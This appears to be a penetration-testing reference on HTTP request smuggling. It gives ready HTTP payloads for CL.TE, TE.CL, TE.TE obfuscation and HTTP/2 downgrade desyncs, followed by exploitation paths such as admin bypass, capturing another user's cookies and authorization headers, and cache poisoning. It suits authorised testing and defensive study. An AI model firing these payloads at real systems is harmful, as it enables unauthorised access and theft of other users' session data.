# HTTP Smuggling Techniques

## When to Use

Consult when proxy is confirmed in Phase 1. Contains specific desync payloads for CL.TE, TE.CL, and TE.TE variants.

---

## CL.TE Desync

Front-end uses Content-Length, back-end uses Transfer-Encoding.

### Detection Payload (Time-Based)
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

1
Z
Q
```
**Expected behavior:** Front-end sends 4 bytes (per CL). Back-end parses chunks — reads chunk `1\r\nZ`, then waits for next chunk. Causes timeout delay on the back-end (~5-10 seconds).

If response is delayed → CL.TE desync confirmed.

### Exploitation Payload (Prefix Injection)
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 30
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X: 
```
Back-end sees chunk terminator `0\r\n\r\n`, then treats `GET /admin...` as the START of the next request. The next real user request gets prepended with your smuggled prefix.

---

## TE.CL Desync

Front-end uses Transfer-Encoding, back-end uses Content-Length.

### Detection Payload (Time-Based)
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

X
```
**Expected behavior:** Front-end processes chunks — sees `0\r\n\r\n` (end of chunked body), forwards everything. Back-end reads 6 bytes (per CL), finishes the request. The `X` is left in the buffer as the start of the next request. Follow-up request will be corrupted.

### Exploitation Payload
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5c
POST /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```
The `5c` hex = 92 bytes for the smuggled request body.

---

## TE.TE Desync (Obfuscation)

Both support TE but one can be confused:

### Obfuscation Variations
```
Transfer-Encoding: xchunked
Transfer-Encoding : chunked          (space before colon)
Transfer-Encoding: chunked
Transfer-Encoding: x                 (duplicate with invalid)
Transfer-Encoding:chunked            (no space)
Transfer-Encoding: chunked\r\nTransfer-encoding: cow
Transfer-Encoding
 : chunked                           (line folding)
X: x\r\nTransfer-Encoding: chunked   (header injection)
Transfer-Encoding: identity, chunked
```

Test each variation. If one server processes chunked and the other falls back to CL, you have a desync.

---

## Safe Testing Strategy

**Critical:** Smuggling affects shared connections. Other users can be impacted.

### Self-Targeting Method
1. Use detection payloads that cause delays (timing-based) — no content poisoning
2. Use unique headers to identify your smuggled requests
3. Test during low-traffic periods if possible
4. Use cache-busted URLs to limit blast radius

### Verify Self-Impact Only
```http
POST / HTTP/1.1
Host: target.com
Content-Length: [calculated]
Transfer-Encoding: chunked

0

GET /my-unique-path-12345 HTTP/1.1
Host: target.com

```
Then immediately send a normal request. If your normal request returns the response for `/my-unique-path-12345`, you've confirmed self-poisoning without affecting others.

---

## HTTP/2 Downgrade Smuggling

If front-end speaks HTTP/2 but downgrades to HTTP/1.1 for the backend:

### H2.CL Desync
HTTP/2 doesn't use Content-Length for framing (uses frame length). But the CL header may be forwarded to the HTTP/1.1 backend:
```
:method: POST
:path: /
content-length: 0

GET /admin HTTP/1.1
Host: target.com

```
The HTTP/2 frame contains the full body. Front-end forwards it to backend as HTTP/1.1 with CL:0. Backend reads 0 bytes, leaves the smuggled request in the buffer.

### H2.TE Desync
Similar but abusing Transfer-Encoding injection via HTTP/2 headers:
```
:method: POST
:path: /
transfer-encoding: chunked

0

SMUGGLED
```

---

## Impact Exploitation Paths

### 1. Access Control Bypass
Smuggle a request to an admin-only path. The front-end proxy sees your request to `/`, the backend processes your smuggled request to `/admin`.

### 2. Request Hijacking
Smuggle a partial request that captures the next user's headers:
```
POST /store-input HTTP/1.1
Content-Length: 9999

data=
```
The next user's request (including cookies, authorization headers) becomes the body of your smuggled POST, stored where you can retrieve it.

### 3. Cache Poisoning
Smuggle a request that causes a malicious response to be cached for a legitimate URL. See [[cache-poisoning]].

### 4. Reflected XSS Amplification
Turn a reflected XSS (requires victim click) into a stored attack by poisoning the cache with the XSS response.
